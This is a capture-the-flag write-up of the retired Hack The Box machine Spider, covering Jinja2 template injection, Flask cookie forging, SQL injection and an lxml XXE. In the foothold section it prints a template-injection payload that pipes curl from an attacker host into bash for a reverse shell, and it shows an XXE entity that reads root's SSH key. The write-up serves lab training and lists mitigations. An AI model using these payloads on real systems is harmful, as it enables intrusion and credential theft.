---
machine: Spider
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, flask, ssti, jinja2, sqli, cookie, waf, xxe, lxml, privesc]
---

# Spider — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The site is Flask and the session cookie contains `username` and `uuid`. Registering `0x{{7*7}}` makes the profile return `49`: Jinja2 SSTI. `{{config}}` leaks `SECRET_KEY`, allowing arbitrary cookies to be signed. The cookie's `uuid` reaches a SQL query; sqlmap extracts `chiv`'s identifier and the admin panel is reached. It has another SSTI, blind and behind a WAF, used to launch a reverse shell as `chiv`. Her SSH key gives host access; `localhost:8080` runs a beta login that processes XML in a cookie with `lxml`, vulnerable to XXE, and reads root's SSH key.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22`: OpenSSH.
- `80`: nginx with a Flask shop.

```bash
echo '<IP> spider.htb' | sudo tee -a /etc/hosts
```

The session cookie is a Flask one and can be decoded:

```json
{"cart_items": [], "username": "", "uuid": ""}
```

## Enumeration

Registration accepts a username and shows it on the profile. SSTI is tested with `0x{{7*7}}`; the profile returns `0x49`, confirming Jinja2. Injection is limited, but `{{config}}` exposes the configuration and `SECRET_KEY`.

With the key, Flask cookies can be signed. The cookie contains a `uuid` used in a SQL query; a `'` triggers an error, and sqlmap confirms time-based and UNION injection.

## Foothold

A cookie is forged with `chiv`'s `uuid` to reach the admin panel. The panel has an additional SSTI, blind and filtered by a WAF. Blocked characters are encoded, and a Jinja2 expression imports `os` and calls an attacker listener:

```text
{{request.application.__globals__.__builtins__.__import__('os').popen('curl http://<LHOST>/shell.sh|bash').read()}}
```

Execution returns a shell as `chiv`. Her home contains a private SSH key.

## Lateral movement

The key logs in over SSH. Port `8080` only listens on localhost; forward it:

```bash
ssh -i chiv.key chiv@spider.htb -L 8888:localhost:8080
```

The service shows a beta login that builds an XML cookie from form fields and parses it with `lxml`.

## Privilege escalation

The cookie XML is vulnerable to XXE. An external entity reads system files and reflects them in the response:

```xml
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///root/.ssh/id_rsa'>]>
```

The same method reads `/root/root.txt`. Root's private key gives SSH access and completes the machine.

## Evidence

- SSTI in the username and `SECRET_KEY` leaked with `{{config}}`.
- Forged cookie and SQLi in `uuid` to obtain `chiv`'s identifier.
- Blind SSTI in the panel and a reverse shell as `chiv`.
- `chiv`'s SSH key and a tunnel to `localhost:8080`.
- XXE in the XML cookie and root's SSH key.

## Lessons learned

- A username rendered without escaping can be SSTI.
- `{{config}}` leaks secrets when the template environment is not sandboxed.
- Signing a cookie does not prevent content tampering if the key is known.
- A session identifier used in SQL allows user impersonation.
- WAFs are bypassed by encoding characters, not only with new payloads.
- `lxml` with external entities enabled is XXE.

## Mitigations and detection

- Escape output and use `SandboxedEnvironment` in Jinja2.
- Keep `SECRET_KEY` outside the code and rotate it.
- Parameterize queries and never trust the cookie `uuid`.
- Validate and canonicalize input before the WAF; do not use it as the only defence.
- Disable external entities in `lxml` (`resolve_entities=False`).
- Monitor outbound requests from the web server and SSH key reads.

## References

- [0xdf — Spider](https://0xdf.gitlab.io/2021/10/23/htb-spider.html)
- [Hack The Box — Spider](https://app.hackthebox.com/machines/spider)
- [Knowledge — XXE](../../../knowledge/web/xxe.md)
